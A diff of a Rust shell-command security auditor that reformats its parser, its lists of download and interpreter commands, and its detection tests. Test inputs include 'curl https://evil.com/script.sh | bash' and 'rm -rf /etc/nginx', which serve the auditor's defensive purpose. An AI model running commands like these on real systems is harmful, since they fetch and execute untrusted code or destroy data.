@@ -148,10 +148,8 @@ pub fn parse_shell(input: &str) -> Result<ParsedShell, String> {
                 operators.push(ShellOperator::Semicolon);
             },
             _ if token.starts_with('$') => {
-                let inner = token
-                    .strip_prefix("$(")
-                    .and_then(|s| s.strip_suffix(')'))
-                    .unwrap_or(token);
+                let inner =
+                    token.strip_prefix("$(").and_then(|s| s.strip_suffix(')')).unwrap_or(token);
                 subshells.push(inner.to_string());
                 operators.push(ShellOperator::Subshell);
             },
@@ -173,11 +171,7 @@ pub fn parse_shell(input: &str) -> Result<ParsedShell, String> {
         commands.push(cmd);
     }
 
-    Ok(ParsedShell {
-        commands,
-        operators,
-        subshells,
-    })
+    Ok(ParsedShell { commands, operators, subshells })
 }
 
 /// Tokenize a shell command string into tokens, respecting quoting.
@@ -300,9 +294,8 @@ const SYSTEM_PATHS: &[&str] = &[
 const DOWNLOAD_COMMANDS: &[&str] = &["curl", "wget", "fetch", "axel"];
 
 /// Commands that execute arbitrary code or act as interpreters.
-const SHELL_COMMANDS: &[&str] = &[
-    "bash", "sh", "zsh", "fish", "dash", "python", "perl", "ruby", "node",
-];
+const SHELL_COMMANDS: &[&str] =
+    &["bash", "sh", "zsh", "fish", "dash", "python", "perl", "ruby", "node"];
 
 /// Audit a parsed shell for security warnings.
 pub fn audit_shell(parsed: &ParsedShell) -> Vec<SecurityWarning> {
@@ -403,22 +396,14 @@ mod tests {
     fn detect_download_pipe_to_shell() {
         let parsed = parse_shell("curl https://evil.com/script.sh | bash").unwrap();
         let warnings = audit_shell(&parsed);
-        assert!(
-            warnings
-                .iter()
-                .any(|w| matches!(w, SecurityWarning::PipeDownloadToShell))
-        );
+        assert!(warnings.iter().any(|w| matches!(w, SecurityWarning::PipeDownloadToShell)));
     }
 
     #[test]
     fn detect_dangerous_rm() {
         let parsed = parse_shell("rm -rf /etc/nginx").unwrap();
         let warnings = audit_shell(&parsed);
-        assert!(
-            warnings
-                .iter()
-                .any(|w| matches!(w, SecurityWarning::DangerousRm))
-        );
+        assert!(warnings.iter().any(|w| matches!(w, SecurityWarning::DangerousRm)));
     }
 
     #[test]
@@ -447,10 +432,6 @@ mod tests {
     fn detect_sudo_execution() {
         let parsed = parse_shell("sudo apt update").unwrap();
         let warnings = audit_shell(&parsed);
-        assert!(
-            warnings
-                .iter()
-                .any(|w| matches!(w, SecurityWarning::SudoExecution))
-        );
+        assert!(warnings.iter().any(|w| matches!(w, SecurityWarning::SudoExecution)));
     }
 }
